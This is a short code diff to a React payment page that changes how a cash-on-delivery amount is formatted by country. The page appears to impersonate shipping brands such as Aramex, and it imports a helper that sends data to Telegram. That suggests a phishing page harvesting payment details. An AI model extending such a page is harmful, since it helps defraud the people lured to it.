@@ -7,6 +7,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCountryByCode } from "@/lib/countries";
+import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
@@ -39,14 +40,16 @@ const PaymentRecipient = () => {
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  const shippingInfo = linkData?.payload as any;
-  const amount = shippingInfo?.cod_amount || 500;
-  const formattedAmount = `${amount} ر.س`;
 
-  // Get country from link data
+  // Get country from link data (must be before using currency functions)
   const countryCode = linkData?.country_code || "SA";
   const countryData = getCountryByCode(countryCode);
   const phoneCode = countryData?.phoneCode || "+966";
+
+  const shippingInfo = linkData?.payload as any;
+  const amount = shippingInfo?.cod_amount || 500;
+  const formattedAmount = formatCurrency(amount, countryCode);
+
   const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
   
   const heroImages: Record<string, string> = {
